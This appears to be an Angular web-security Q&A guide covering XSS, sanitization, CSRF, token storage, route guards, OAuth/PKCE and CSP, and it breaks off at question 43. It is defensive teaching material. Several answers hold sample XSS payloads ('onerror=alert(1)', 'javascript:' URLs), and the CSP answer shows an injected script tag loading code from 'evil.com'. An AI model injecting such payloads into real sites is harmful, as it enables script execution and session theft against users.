- [304: What happens if you pass a SafeUrl to an innerHTML binding?](#304-what-happens-if-you-pass-a-safeurl-to-an-innerhtml-binding)
- [305: How would you control the use of bypassSecurityTrust in a big codebase?](#305-how-would-you-control-the-use-of-bypasssecuritytrust-in-a-big-codebase)
- [306: How do Trusted Types and Angular's sanitizer work together?](#306-how-do-trusted-types-and-angulars-sanitizer-work-together)
- [307: Why is a Trusted Types default policy risky?](#307-why-is-a-trusted-types-default-policy-risky)
- [308: How would you roll out Trusted Types on a large existing Angular app?](#308-how-would-you-roll-out-trusted-types-on-a-large-existing-angular-app)
- [309: Why are allowlist-based CSPs considered weak?](#309-why-are-allowlist-based-csps-considered-weak)
- [310: What is a script gadget?](#310-what-is-a-script-gadget)
- [311: How does 'strict-dynamic' work with Angular's lazy chunks?](#311-how-does-strict-dynamic-work-with-angulars-lazy-chunks)
- [312: How do you generate a CSP nonce for Angular SSR?](#312-how-do-you-generate-a-csp-nonce-for-angular-ssr)
- [313: When would you choose a hash-based CSP over a nonce-based one?](#313-when-would-you-choose-a-hash-based-csp-over-a-nonce-based-one)
- [314: What attacks does CSP not stop?](#314-what-attacks-does-csp-not-stop)
- [315: What is dangling markup injection?](#315-what-is-dangling-markup-injection)
- [316: Is client-side template injection a real risk in modern Angular?](#316-is-client-side-template-injection-a-real-risk-in-modern-angular)
- [317: How do you handle template injection risk in an AngularJS/Angular hybrid app?](#317-how-do-you-handle-template-injection-risk-in-an-angularjsangular-hybrid-app)
- [318: Why did Angular deprecate runtime compilation APIs?](#318-why-did-angular-deprecate-runtime-compilation-apis)
- [319: What is prototype pollution and how can it affect an Angular app?](#319-what-is-prototype-pollution-and-how-can-it-affect-an-angular-app)
- [320: Are Angular template expressions a sandbox?](#320-are-angular-template-expressions-a-sandbox)
- [321: How do you find all DOM XSS sinks in a large Angular codebase?](#321-how-do-you-find-all-dom-xss-sinks-in-a-large-angular-codebase)
- [322: What is the difference between ElementRef, Renderer2 and afterNextRender for DOM work?](#322-what-is-the-difference-between-elementref-renderer2-and-afternextrender-for-dom-work)
- [323: How would you design token storage for a new Angular app?](#323-how-would-you-design-token-storage-for-a-new-angular-app)
- [324: How does a BFF work with an Angular app in practice?](#324-how-does-a-bff-work-with-an-angular-app-in-practice)
- [325: What is DPoP and how can it protect tokens in an SPA?](#325-what-is-dpop-and-how-can-it-protect-tokens-in-an-spa)
- [326: How do you avoid multiple refresh calls when many requests get 401 at once?](#326-how-do-you-avoid-multiple-refresh-calls-when-many-requests-get-401-at-once)
- [327: How do you stop two browser tabs from refreshing tokens at the same time?](#327-how-do-you-stop-two-browser-tabs-from-refreshing-tokens-at-the-same-time)
- [328: Is it safe to retry a POST after refreshing a token?](#328-is-it-safe-to-retry-a-post-after-refreshing-a-token)
- [329: What requests skip your Angular interceptors?](#329-what-requests-skip-your-angular-interceptors)
- [330: How can tokens leak to third parties even if your interceptor is correct?](#330-how-can-tokens-leak-to-third-parties-even-if-your-interceptor-is-correct)
- [331: Can you hide the access token from XSS by keeping it in a Web Worker?](#331-can-you-hide-the-access-token-from-xss-by-keeping-it-in-a-web-worker)
- [332: Why is XSS "game over" no matter where tokens are stored?](#332-why-is-xss-game-over-no-matter-where-tokens-are-stored)
- [333: How would you design permissions so the UI and API stay in sync?](#333-how-would-you-design-permissions-so-the-ui-and-api-stay-in-sync)
- [334: How do you write a permission-based structural directive?](#334-how-do-you-write-a-permission-based-structural-directive)
- [335: What happens to the UI when a user's role changes during their session?](#335-what-happens-to-the-ui-when-a-users-role-changes-during-their-session)
- [336: What security issues are specific to multi-tenant Angular apps?](#336-what-security-issues-are-specific-to-multi-tenant-angular-apps)
- [337: How can you serve different components on the same path depending on role?](#337-how-can-you-serve-different-components-on-the-same-path-depending-on-role)
- [338: How can a user bypass Angular guards and what does that tell you?](#338-how-can-a-user-bypass-angular-guards-and-what-does-that-tell-you)
- [339: Walk through the OAuth2 authorization code flow with PKCE and what each part protects.](#339-walk-through-the-oauth2-authorization-code-flow-with-pkce-and-what-each-part-protects)
- [340: What is an OAuth mix-up attack and how is it prevented?](#340-what-is-an-oauth-mix-up-attack-and-how-is-it-prevented)
- [341: What does the OAuth 2.0 for Browser-Based Applications guidance recommend?](#341-what-does-the-oauth-20-for-browser-based-applications-guidance-recommend)
- [342: How can an open redirect be used to steal OAuth codes?](#342-how-can-an-open-redirect-be-used-to-steal-oauth-codes)
- [343: Where should the PKCE code_verifier be stored during the redirect?](#343-where-should-the-pkce-code_verifier-be-stored-during-the-redirect)
- [344: What are the trade-offs of MSAL's cacheLocation options?](#344-what-are-the-trade-offs-of-msals-cachelocation-options)
- [345: How do you avoid redirect loops with MSAL Angular?](#345-how-do-you-avoid-redirect-loops-with-msal-angular)
- [346: Why should you request the smallest scopes possible?](#346-why-should-you-request-the-smallest-scopes-possible)
- [347: What is audience confusion with tokens?](#347-what-is-audience-confusion-with-tokens)
- [348: What are front-channel and back-channel logout?](#348-what-are-front-channel-and-back-channel-logout)
- [349: How do you share idle activity between tabs?](#349-how-do-you-share-idle-activity-between-tabs)
- [350: What is an absolute session lifetime and why have one?](#350-what-is-an-absolute-session-lifetime-and-why-have-one)
- [351: How do you add step-up authentication for a sensitive action?](#351-how-do-you-add-step-up-authentication-for-a-sensitive-action)
- [352: How does Angular's XSRF protection work as a double-submit cookie, and what are its weak points?](#352-how-does-angulars-xsrf-protection-work-as-a-double-submit-cookie-and-what-are-its-weak-points)
- [353: What is login CSRF and how do you prevent it?](#353-what-is-login-csrf-and-how-do-you-prevent-it)
- [354: How can a JSON API be hit by CSRF?](#354-how-can-a-json-api-be-hit-by-csrf)
- [355: What CORS mistakes have you seen in real projects?](#355-what-cors-mistakes-have-you-seen-in-real-projects)
- [356: Why does a JSONP endpoint need to validate the callback name?](#356-why-does-a-jsonp-endpoint-need-to-validate-the-callback-name)
- [357: What URL tricks bypass weak returnUrl validation?](#357-what-url-tricks-bypass-weak-returnurl-validation)
- [358: What was the protocol-relative URL issue in Angular's XSRF interceptor?](#358-what-was-the-protocol-relative-url-issue-in-angulars-xsrf-interceptor)
- [359: What is host header injection in Angular SSR and how does allowedHosts help?](#359-what-is-host-header-injection-in-angular-ssr-and-how-does-allowedhosts-help)
- [360: What does trustProxyHeaders do in Angular SSR?](#360-what-does-trustproxyheaders-do-in-angular-ssr)
- [361: How could relative URLs in HttpClient lead to SSRF during SSR?](#361-how-could-relative-urls-in-httpclient-lead-to-ssrf-during-ssr)
- [362: How did a race condition in Angular SSR leak data between requests, and how was it fixed?](#362-how-did-a-race-condition-in-angular-ssr-leak-data-between-requests-and-how-was-it-fixed)
- [363: How does Angular prevent XSS through serialized TransferState?](#363-how-does-angular-prevent-xss-through-serialized-transferstate)
- [364: How do you set security headers per route in Angular SSR?](#364-how-do-you-set-security-headers-per-route-in-angular-ssr)
- [365: What are the caching risks when SSR pages contain user data?](#365-what-are-the-caching-risks-when-ssr-pages-contain-user-data)
- [366: How do you keep server-only secrets out of the browser bundle in an SSR project?](#366-how-do-you-keep-server-only-secrets-out-of-the-browser-bundle-in-an-ssr-project)
- [367: How can SSR be abused for denial of service?](#367-how-can-ssr-be-abused-for-denial-of-service)
- [368: What should an SSR server show when rendering fails?](#368-what-should-an-ssr-server-show-when-rendering-fails)
- [369: What is the risk of prerendering with build-time credentials?](#369-what-is-the-risk-of-prerendering-with-build-time-credentials)
- [370: How do secrets end up in Angular bundles by accident?](#370-how-do-secrets-end-up-in-angular-bundles-by-accident)
- [371: How do you find what code is in your production bundle?](#371-how-do-you-find-what-code-is-in-your-production-bundle)
- [372: What is sourcesContent in source maps and why does it matter?](#372-what-is-sourcescontent-in-source-maps-and-why-does-it-matter)
- [373: What is double-clickjacking?](#373-what-is-double-clickjacking)
- [374: Why should user-uploaded content live on a separate domain?](#374-why-should-user-uploaded-content-live-on-a-separate-domain)
- [375: How can a subdomain takeover affect your Angular app?](#375-how-can-a-subdomain-takeover-affect-your-angular-app)
- [376: How do you decide if an npm audit finding actually matters?](#376-how-do-you-decide-if-an-npm-audit-finding-actually-matters)
- [377: What Angular security issues were fixed in recent years?](#377-what-angular-security-issues-were-fixed-in-recent-years)
- [378: How do you roll out an urgent Angular security patch across many apps?](#378-how-do-you-roll-out-an-urgent-angular-security-patch-across-many-apps)
- [379: What did the 2025 npm worm attacks teach front-end teams?](#379-what-did-the-2025-npm-worm-attacks-teach-front-end-teams)
- [380: What is npm provenance and how do you check it?](#380-what-is-npm-provenance-and-how-do-you-check-it)
- [381: What is lockfile injection and how do you catch it?](#381-what-is-lockfile-injection-and-how-do-you-catch-it)
- [382: What is an SBOM and why does it help Angular teams?](#382-what-is-an-sbom-and-why-does-it-help-angular-teams)
- [383: What CSP settings do Web Workers need, and why are blob workers risky?](#383-what-csp-settings-do-web-workers-need-and-why-are-blob-workers-risky)
- [384: Why should you never accept "null" as a postMessage origin?](#384-why-should-you-never-accept-null-as-a-postmessage-origin)
- [385: How does Cross-Origin-Opener-Policy affect OAuth popups?](#385-how-does-cross-origin-opener-policy-affect-oauth-popups)
- [386: What are COEP and CORP, and when do Angular apps need them?](#386-what-are-coep-and-corp-and-when-do-angular-apps-need-them)
- [387: How can translation files become an XSS vector with Angular i18n?](#387-how-can-translation-files-become-an-xss-vector-with-angular-i18n)
- [388: What are the risks of loading translations at runtime?](#388-what-are-the-risks-of-loading-translations-at-runtime)
- [389: How would you threat model an Angular app?](#389-how-would-you-threat-model-an-angular-app)
- [390: What would you check in a pen test of an Angular SPA?](#390-what-would-you-check-in-a-pen-test-of-an-angular-spa)
- [391: How do you test auth flows end-to-end without weakening security?](#391-how-do-you-test-auth-flows-end-to-end-without-weakening-security)
- [392: How do you prevent bypassSecurityTrust from slipping into the code with tests?](#392-how-do-you-prevent-bypasssecuritytrust-from-slipping-into-the-code-with-tests)
- [393: How would you write a CodeQL query idea for DOM XSS in Angular?](#393-how-would-you-write-a-codeql-query-idea-for-dom-xss-in-angular)
- [394: How can CSP and Trusted Types reports help you detect attacks?](#394-how-can-csp-and-trusted-types-reports-help-you-detect-attacks)
- [395: What would you do if you found an XSS vulnerability in production?](#395-what-would-you-do-if-you-found-an-xss-vulnerability-in-production)
- [396: A secret was found in your deployed Angular bundle. What do you do?](#396-a-secret-was-found-in-your-deployed-angular-bundle-what-do-you-do)
- [397: How would you safely support YouTube and Vimeo embeds in user posts?](#397-how-would-you-safely-support-youtube-and-vimeo-embeds-in-user-posts)
- [398: How do you embed a third-party BI dashboard that needs a token?](#398-how-do-you-embed-a-third-party-bi-dashboard-that-needs-a-token)
- [399: How would you migrate from JWTs in localStorage to cookie-based sessions?](#399-how-would-you-migrate-from-jwts-in-localstorage-to-cookie-based-sessions)
- [400: What security issues come with micro frontends on the same origin?](#400-what-security-issues-come-with-micro-frontends-on-the-same-origin)
- [401: How do you secure loading of remote micro frontends with Native Federation or Module Federation?](#401-how-do-you-secure-loading-of-remote-micro-frontends-with-native-federation-or-module-federation)
- [402: How would you design an "impersonate user" feature for support staff?](#402-how-would-you-design-an-impersonate-user-feature-for-support-staff)
- [403: How do you preview user-uploaded HTML or PDF files safely?](#403-how-do-you-preview-user-uploaded-html-or-pdf-files-safely)
- [404: How do you safely turn URLs and mentions in chat messages into links?](#404-how-do-you-safely-turn-urls-and-mentions-in-chat-messages-into-links)
- [405: What front-end rules apply to payment pages under PCI DSS 4.0?](#405-what-front-end-rules-apply-to-payment-pages-under-pci-dss-40)
- [406: How would you secure an Angular app used on shared or kiosk computers?](#406-how-would-you-secure-an-angular-app-used-on-shared-or-kiosk-computers)
- [407: What changes when an Angular app runs inside Capacitor or a mobile WebView?](#407-what-changes-when-an-angular-app-runs-inside-capacitor-or-a-mobile-webview)
- [408: How do you secure a GraphQL client like Apollo Angular?](#408-how-do-you-secure-a-graphql-client-like-apollo-angular)
- [409: Do httpResource and resource() change anything about security?](#409-do-httpresource-and-resource-change-anything-about-security)
- [410: How do you share validation rules between Angular and the server?](#410-how-do-you-share-validation-rules-between-angular-and-the-server)
- [411: What is CSV injection and can an Angular export feature cause it?](#411-what-is-csv-injection-and-can-an-angular-export-feature-cause-it)
- [412: Why are blob URLs of user HTML dangerous?](#412-why-are-blob-urls-of-user-html-dangerous)
- [413: Is window.open with a user URL safe?](#413-is-windowopen-with-a-user-url-safe)
- [414: How can a service worker turn an XSS into a persistent attack?](#414-how-can-a-service-worker-turn-an-xss-into-a-persistent-attack)
- [415: How does the Angular service worker check file integrity?](#415-how-does-the-angular-service-worker-check-file-integrity)
- [416: How do you make sure users get a security fix when you use the Angular service worker?](#416-how-do-you-make-sure-users-get-a-security-fix-when-you-use-the-angular-service-worker)
- [417: What is safety-worker.js in Angular?](#417-what-is-safety-workerjs-in-angular)
- [418: Does zoneless change detection affect security?](#418-does-zoneless-change-detection-affect-security)
- [419: Why should you never use Angular's private ɵ APIs to get around sanitization?](#419-why-should-you-never-use-angulars-private-ɵ-apis-to-get-around-sanitization)
- [420: What layers of defense would you put in an Angular app against XSS?](#420-what-layers-of-defense-would-you-put-in-an-angular-app-against-xss)
- [421: What security headers would you set for a typical Angular SPA?](#421-what-security-headers-would-you-set-for-a-typical-angular-spa)
- [422: How do you measure the security headers of a deployed app?](#422-how-do-you-measure-the-security-headers-of-a-deployed-app)
- [423: How should a front-end team handle incoming security reports?](#423-how-should-a-front-end-team-handle-incoming-security-reports)
- [424: What's wrong with logging security events only from the client?](#424-whats-wrong-with-logging-security-events-only-from-the-client)
- [425: Does encrypting data in localStorage make it safe?](#425-does-encrypting-data-in-localstorage-make-it-safe)
- [426: Is code obfuscation a security measure for Angular apps?](#426-is-code-obfuscation-a-security-measure-for-angular-apps)
- [427: How do you protect an Angular app's APIs from bots?](#427-how-do-you-protect-an-angular-apps-apis-from-bots)
- [428: How would you secure a new Angular app from day one?](#428-how-would-you-secure-a-new-angular-app-from-day-one)
- [429: Why is it easier to add CSP and Trusted Types at the start of a project?](#429-why-is-it-easier-to-add-csp-and-trusted-types-at-the-start-of-a-project)
- [430: What would you do if the business wants to add a marketing tag to every page, including login?](#430-what-would-you-do-if-the-business-wants-to-add-a-marketing-tag-to-every-page-including-login)
- [431: How do you safely let admins customize the app's look with CSS?](#431-how-do-you-safely-let-admins-customize-the-apps-look-with-css)
- [432: Can CSS injection leak data from an Angular app?](#432-can-css-injection-leak-data-from-an-angular-app)
- [433: What are the security considerations of @defer blocks?](#433-what-are-the-security-considerations-of-defer-blocks)
- [434: How do you handle security of iframes created by Angular components dynamically?](#434-how-do-you-handle-security-of-iframes-created-by-angular-components-dynamically)
- [435: What can go wrong with Angular's HttpClient when the API uses redirects?](#435-what-can-go-wrong-with-angulars-httpclient-when-the-api-uses-redirects)
- [436: How do you protect against session fixation in a cookie-based Angular app?](#436-how-do-you-protect-against-session-fixation-in-a-cookie-based-angular-app)
- [437: Why should the Angular app avoid storing user data in URLs?](#437-why-should-the-angular-app-avoid-storing-user-data-in-urls)
- [438: How does the browser's Referer header interact with Angular routes?](#438-how-does-the-browsers-referer-header-interact-with-angular-routes)
- [439: How can an attacker abuse an "export my data" feature?](#439-how-can-an-attacker-abuse-an-export-my-data-feature)
- [440: What are the risks when Angular apps use browser extensions' APIs or vice versa?](#440-what-are-the-risks-when-angular-apps-use-browser-extensions-apis-or-vice-versa)
- [441: How do you avoid leaking data through the browser's autofill and page title?](#441-how-do-you-avoid-leaking-data-through-the-browsers-autofill-and-page-title)
- [442: What's the risk of verbose API errors shown directly in Angular?](#442-whats-the-risk-of-verbose-api-errors-shown-directly-in-angular)
- [443: How would you secure feature toggles that are evaluated on the client?](#443-how-would-you-secure-feature-toggles-that-are-evaluated-on-the-client)
- [444: Can an attacker use your Angular app's own JavaScript against it?](#444-can-an-attacker-use-your-angular-apps-own-javascript-against-it)
- [445: Why shouldn't routes trigger destructive actions on load?](#445-why-shouldnt-routes-trigger-destructive-actions-on-load)
- [446: How do you limit what a compromised third-party script can do?](#446-how-do-you-limit-what-a-compromised-third-party-script-can-do)
- [447: What does the OWASP ASVS add on top of the Top 10 for Angular teams?](#447-what-does-the-owasp-asvs-add-on-top-of-the-top-10-for-angular-teams)
- [448: How do you test that your CSP actually blocks an XSS payload?](#448-how-do-you-test-that-your-csp-actually-blocks-an-xss-payload)
- [449: What is the difference between output encoding for HTML, attributes, URLs and JavaScript?](#449-what-is-the-difference-between-output-encoding-for-html-attributes-urls-and-javascript)
- [450: What is the most important thing to remember about Angular security?](#450-what-is-the-most-important-thing-to-remember-about-angular-security)

---

# Easy Questions (1-150)

## 1: What is XSS and why does it matter for an Angular app?

XSS (cross-site scripting) is when an attacker gets their own JavaScript to run inside your page. Once that happens, the script can do anything the user can do: read data on the page, call your API with the user's session, change what the user sees or send data to another server.

Angular apps are a common target because they render a lot of data that came from users or APIs. Angular blocks the most common XSS paths by default, but you can still open holes if you go around its protections.

## 2: How does Angular protect against XSS by default?

Angular treats every value as untrusted by default. When you bind a value into the template, Angular either escapes it (for interpolation and text) or sanitizes it (for things like `[innerHTML]` and URLs) before it reaches the DOM.

So if a user's name is `<script>alert(1)</script>`, Angular shows that text on the screen instead of running it. You don't have to do anything special to get this protection; you just have to avoid turning it off.

## 3: What is the difference between escaping and sanitizing?

Escaping turns special characters into safe text, so `<b>` becomes `&lt;b&gt;` and is shown literally. Nothing in the value is treated as HTML.

Sanitizing keeps the value as HTML but removes the dangerous parts. For example, `<b onclick="x()">Hi</b><script>...</script>` becomes `<b>Hi</b>`. Angular escapes interpolated text and sanitizes values bound to HTML, style and URL properties.

## 4: Is interpolation with double curly braces safe?

Yes. `{{ value }}` always inserts the value as text, not HTML. Any `<`, `>` or `&` characters are shown as they are and never become elements.

```html
<!-- If comment is "<img src=x onerror=alert(1)>", the user just sees that text -->
<p>{{ comment }}</p>
```

## 5: What happens when you bind user data to innerHTML?

When you write `[innerHTML]="value"`, Angular runs the value through its HTML sanitizer first. It keeps safe tags like `<b>`, `<p>` and `<a>`, and removes things like `<script>`, inline event handlers (`onclick`, `onerror`) and `javascript:` URLs.

```html
<div [innerHTML]="article.body"></div>
```

In development mode Angular logs a warning to the console when sanitizing changed the value, which helps you notice that something was stripped.

## 6: Why should you prefer interpolation over innerHTML when possible?

Interpolation never creates HTML, so there is nothing to sanitize and nothing to get wrong. `[innerHTML]` is safe because of the sanitizer, but it still lets some HTML through, which means styling problems, broken layouts or phishing-style content (fake links, fake forms) are still possible.

If you only need to show text, use `{{ }}`. Use `[innerHTML]` only when the content really is HTML, like a blog post body.

## 7: What is DomSanitizer?

`DomSanitizer` is an Angular service that cleans values so they are safe to put into the DOM. Angular uses it internally for every risky binding. You can also inject it to sanitize values yourself or to mark values as trusted.

```ts
import { DomSanitizer, SecurityContext } from "@angular/platform-browser";

const sanitizer = inject(DomSanitizer);
const clean = sanitizer.sanitize(SecurityContext.HTML, userHtml);
```

## 8: What are the security contexts in Angular?

Angular has four contexts that decide how a value is cleaned:

- **HTML**: used for `[innerHTML]`. The value is sanitized.
- **Style**: used for binding CSS values into the `style` attribute.
- **URL**: used for things like `[href]` on links and `[src]` on images. The value is sanitized.
- **Resource URL**: used for URLs that load and run code, like `<script src>` or `<iframe src>`. These can't be sanitized, so Angular blocks untrusted values.

They are listed in the `SecurityContext` enum, which also has `NONE` and `SCRIPT`.

## 9: What does Angular do with a javascript: URL in an href binding?

It treats it as unsafe. When you write `[href]="link"` and `link` is `javascript:alert(1)`, Angular's URL sanitizer prefixes it with `unsafe:`, so the browser won't run it.

```html
<a [href]="userLink">Profile</a>
<!-- Rendered as href="unsafe:javascript:alert(1)" -->
```

Normal `http:`, `https:`, `mailto:`, `tel:` and relative URLs pass through untouched.

## 10: What is a resource URL and why is it treated differently?

A resource URL is a URL that the browser loads and executes as code or as a full document, for example `<iframe [src]>`, `<script [src]>` or `<object [data]>`. Even a perfectly normal `https://` URL can be dangerous here if it points to a site the attacker controls.

Angular can't tell good resource URLs from bad ones, so it refuses to bind untrusted values to them. You get an error like "unsafe value used in a resource URL context" until you explicitly trust the value.

## 11: What are the bypassSecurityTrust methods?

They are methods on `DomSanitizer` that tell Angular "I checked this value, don't sanitize it":

- `bypassSecurityTrustHtml`
- `bypassSecurityTrustStyle`
- `bypassSecurityTrustScript`
- `bypassSecurityTrustUrl`
- `bypassSecurityTrustResourceUrl`

They return a wrapped value (like `SafeHtml`) that Angular will insert as is. They don't clean anything; they only switch the protection off for that value.

## 12: Why are bypassSecurityTrust methods risky?

Because they turn off Angular's XSS protection for that value. If any part of the value can come from a user or an outside system, an attacker can put a script in it and it will run.

A common bug is writing a "safe HTML" pipe that calls `bypassSecurityTrustHtml` on everything, then using it on user comments. That brings back exactly the XSS hole Angular was protecting you from.

## 13: When is it okay to use bypassSecurityTrustResourceUrl?

When the URL is fully under your control or checked against a strict allowlist. A typical case is embedding a YouTube video where you build the URL yourself and only the video ID comes from data.

```ts
const id = encodeURIComponent(videoId);
this.videoUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
  `https://www.youtube-nocookie.com/embed/${id}`,
);
```

Never pass a full URL from user input or query params straight into it.

## 14: Why shouldn't you access the DOM directly through ElementRef?

`ElementRef.nativeElement` gives you the real DOM element, and anything you do with it skips Angular's sanitization. For example, `el.nativeElement.innerHTML = userInput` is a direct XSS hole.

Direct DOM access also breaks on the server during SSR and makes code harder to test. Prefer template bindings, and use `Renderer2` or host bindings when you need to change elements in code.

## 15: Does Renderer2 sanitize values for you?

No. `Renderer2` gives you a safe abstraction over the DOM that works on the server and in tests, but methods like `setProperty(el, 'innerHTML', value)` don't run Angular's sanitizer.

If you need to set HTML from code, sanitize it first with `DomSanitizer.sanitize(SecurityContext.HTML, value)`, or better, use a template binding.

## 16: What is CSRF?

CSRF (cross-site request forgery) is when another website makes the user's browser send a request to your site. Because the browser attaches the user's cookies automatically, the request runs with the user's session even though the user never meant to send it.

For example, an evil page could submit a hidden form that calls `POST /api/transfer` on your bank site. CSRF matters when the session is stored in cookies.

## 17: How does Angular's HttpClient help against CSRF?

`HttpClient` has a built-in XSRF interceptor. It reads a token from a cookie called `XSRF-TOKEN` and sends it back in a header called `X-XSRF-TOKEN` on mutating requests (like `POST`, `PUT`, `DELETE`) to your own origin.

An attacker's site can't read your cookies, so it can't set that header. The server then checks that the header matches the cookie. Angular only does the client half; the server must create the cookie and verify the header.

## 18: Which requests get the XSRF header automatically?

Only mutating requests (not `GET` or `HEAD`) that go to relative URLs or to the same origin as the app. Requests to other domains don't get the header, so the token isn't leaked to third-party APIs.

If your API is on a different domain, the automatic XSRF header won't be added and you need another approach.

## 19: How do you change the XSRF cookie or header name?

Use `withXsrfConfiguration` when providing `HttpClient`:

```ts
import { provideHttpClient, withXsrfConfiguration } from "@angular/common/http";

bootstrapApplication(App, {
  providers: [
    provideHttpClient(
      withXsrfConfiguration({
        cookieName: "CSRF-TOKEN",
        headerName: "X-CSRF-TOKEN",
      }),
    ),
  ],
});
```

Use this when your back-end framework uses different names than `XSRF-TOKEN` and `X-XSRF-TOKEN`.

## 20: How do you turn off Angular's XSRF protection?

With `withNoXsrfProtection()`:

```ts
provideHttpClient(withNoXsrfProtection());
```

Only do this if you don't use cookie sessions (for example, you send a bearer token in a header) or you have a different CSRF defense on the server. Turning it off "because it gets in the way" usually means the server isn't set up correctly.

## 21: What is a JWT?

A JWT (JSON Web Token) is a signed token with three base64url parts: header, payload and signature, joined by dots. The payload holds claims such as the user ID (`sub`), expiry (`exp`) and roles.

The server signs it, so it can later check that nobody changed it. A JWT is signed, not encrypted, so anyone who has the token can read the payload.

## 22: Can you trust data you decode from a JWT in Angular?

Only for display. The browser doesn't check the signature, and the user can edit the token in storage. So reading `roles` from the JWT is fine for showing or hiding menu items, but the server must check the signature and the permissions on every request.

Also, don't put secrets in the JWT payload, because anyone with the token can decode it.

## 23: Where can an Angular app store an auth token?

Common options:

- **Memory** (a service or signal): lost on refresh, but hardest for XSS to steal later.
- **localStorage**: survives refresh and tabs, but any script on the page can read it.
- **sessionStorage**: like localStorage but per tab, same XSS risk.
- **httpOnly cookie**: set by the server, JavaScript can't read it at all.

The right choice depends on your setup, but many teams prefer httpOnly cookies or memory plus a refresh mechanism.

## 24: Why is localStorage considered risky for tokens?

Any JavaScript running on your page can read `localStorage`, including a script injected through XSS or a compromised npm package. An attacker can copy the token and use it from their own machine until it expires.

That doesn't mean localStorage is always wrong, but it makes the cost of any XSS bug much higher.

## 25: What is an httpOnly cookie?

A cookie with the `HttpOnly` flag can't be read by JavaScript (`document.cookie` won't show it). The browser still sends it with requests to the matching domain.

This protects the session from being stolen by XSS. It doesn't stop XSS from making requests while the user is on the page, but the attacker can't take the token away and reuse it later.

## 26: What do the Secure and SameSite cookie flags do?

- `Secure`: the cookie is only sent over HTTPS, so it can't leak over plain HTTP.
- `SameSite`: controls whether the cookie is sent on cross-site requests. `Strict` never sends it cross-site, `Lax` sends it only on top-level navigations with safe methods like `GET`, and `None` always sends it (and requires `Secure`).

These flags are set by the server in the `Set-Cookie` header. Angular can't set them for httpOnly cookies.

## 27: What is an HTTP interceptor?

An interceptor is a function that runs for every request made with `HttpClient`. It can change the request (for example, add a header), handle the response, or deal with errors in one place.

In modern Angular you write functional interceptors and register them with `withInterceptors`:

```ts
provideHttpClient(withInterceptors([authInterceptor]));
```

## 28: How do you add an auth token to requests with an interceptor?

```ts
import { HttpInterceptorFn } from "@angular/common/http";
import { inject } from "@angular/core";

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(AuthService).accessToken();
  if (!token) return next(req);

  return next(
    req.clone({
      setHeaders: { Authorization: `Bearer ${token}` },
    }),
  );
};
```

Requests are immutable, so you use `clone()` to create a changed copy.

## 29: Why should an auth interceptor not add the token to every URL?

Because the token would then be sent to any domain your app calls, like analytics, CDNs or third-party APIs. Anyone running those servers could read it and use it.

Check the URL first and only attach the token for your own API:

```ts
if (!req.url.startsWith(environment.apiUrl)) return next(req);
```

## 30: What is a route guard?

A route guard is a function the router runs before it activates, loads or leaves a route. It returns `true` to allow navigation, `false` to block it, or a `UrlTree` to redirect.

```ts
export const authGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  return auth.isLoggedIn() ? true : inject(Router).parseUrl("/login");
};
```

## 31: Do route guards secure your data?

No. Guards only control what the Angular router shows. All your JavaScript is already in the user's browser, and they can change it, call your API directly with curl, or edit local state to skip the guard.

Guards are for user experience. Real protection is the server checking authentication and permissions on every API request.

## 32: What does CanActivateFn do?

`CanActivateFn` decides if a route can be activated. It runs every time the user tries to navigate to the route.

```ts
{ path: 'admin', component: AdminPage, canActivate: [adminGuard] }
```

It is the most common guard for "you must be logged in to see this page".

## 33: What does CanMatchFn do?

`CanMatchFn` decides whether a route config can even be matched for the URL. If it returns `false`, the router skips that route and tries the next one. With lazy routes, the code isn't downloaded at all when the guard fails.

```ts
{ path: 'admin', canMatch: [adminGuard], loadChildren: () => import('./admin/routes') }
```

It replaces the old, deprecated `CanLoad` guard.

## 34: What does CanDeactivateFn do?

It runs when the user tries to leave a route. A common use is asking "You have unsaved changes, leave anyway?".

```ts
export const unsavedGuard: CanDeactivateFn<EditPage> = (component) =>
  component.isDirty() ? confirm("Discard changes?") : true;
```

It is about protecting the user's work, not about security.

## 35: Is hiding a button for non-admins enough to secure an admin action?

No. Hiding the button is just good UI. A user can still open dev tools, find the API endpoint, and call it directly. The server must check that the user is an admin before doing the action.

A good rule is: the UI hides what the user can't do, and the server refuses what the user can't do.

## 36: What is OAuth2?

OAuth2 is a standard for giving an app limited access to a user's resources without giving it the user's password. The user logs in at an authorization server (like Google, Microsoft Entra ID, Auth0 or Keycloak), and the app gets an access token to call APIs.

OAuth2 is about authorization (what the app may access). It doesn't define how to identify the user.

## 37: What is OpenID Connect (OIDC)?

OIDC is a layer on top of OAuth2 that adds login. Besides the access token, the server returns an ID token (a JWT) that tells the app who the user is: user ID, name, email and so on.

When an Angular app says "Sign in with Google" or "Sign in with Microsoft", it is usually using OIDC.

## 38: What is PKCE?

PKCE (Proof Key for Code Exchange, said "pixie") protects the OAuth2 authorization code flow for public clients like SPAs. The app creates a random `code_verifier`, sends a hash of it (`code_challenge`) when starting the login, and later sends the original verifier when exchanging the code for tokens.

If someone steals the authorization code, they can't use it without the verifier, which never left the app.

## 39: Why shouldn't an SPA use the implicit flow anymore?

The implicit flow returns the access token directly in the URL fragment. Tokens in URLs can leak through browser history, logs, and the `Referer` header, and there is no way to bind the token to the client.

The current OAuth security best practice is the authorization code flow with PKCE for SPAs. Most libraries, like `angular-oauth2-oidc` and MSAL, support it.

## 40: Which libraries are commonly used for OIDC in Angular?

- `angular-oauth2-oidc`: a general OIDC/OAuth2 client that works with most identity providers.
- `angular-auth-oidc-client`: another certified OIDC client library.
- `@azure/msal-angular` (with `@azure/msal-browser`): Microsoft's library for Entra ID and Azure AD B2C.

Using a known library is safer than writing your own OAuth code, which is easy to get wrong.

## 41: Why can't an Angular app keep a client secret?

Everything in the Angular bundle is downloaded to the user's browser. Anyone can open dev tools and read it, so a "secret" in the code isn't secret.

That's why SPAs are "public clients" in OAuth2. They use PKCE instead of a client secret. If you need a confidential client, put that logic on a back-end (for example a BFF).

## 42: What is Content Security Policy (CSP)?

CSP is an HTTP response header that tells the browser which sources of scripts, styles, images and other content are allowed. If an attacker injects `<script src="https://evil.com/x.js">`, the browser refuses to load it because that origin isn't in the policy.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

It is a second layer of defense: even if an XSS bug exists, CSP can stop the script from running.

## 43: What is a CSP nonce?

A nonce is a random value generated for each response. You put it in the CSP header and on each allowed `<script>` or `<style>` tag:

```html
<script nonce="r4nd0m">
  ...
</script>
```

